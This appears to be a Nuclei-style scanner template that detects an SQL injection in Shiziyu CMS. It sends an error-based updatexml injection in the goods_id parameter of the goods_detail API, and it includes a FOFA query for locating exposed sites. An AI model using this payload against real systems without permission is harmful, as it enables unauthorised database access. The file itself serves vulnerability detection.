http:
- matchers:
  - part: body
    type: word
    words:
    - c8c605999f3d8352d7bb792cf3fdb25
  - status:
    - 404
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)'
id: shiziyu-cms-apicontroller-sqli
info:
  author: SleepingBag945
  description: 'Shiziyu CMS ApiController.class.php parameter filtering is not rigorous,
    resulting in SQL injection vulnerability.

    '
  metadata:
    fofa-query: body="/seller.php?s=/Public/login"
    max-request: 1
    verified: true
  name: Shiziyu CMS Api Controller - SQL Injection
  severity: high
  tags: sqli
variables:
  num: '999999999'
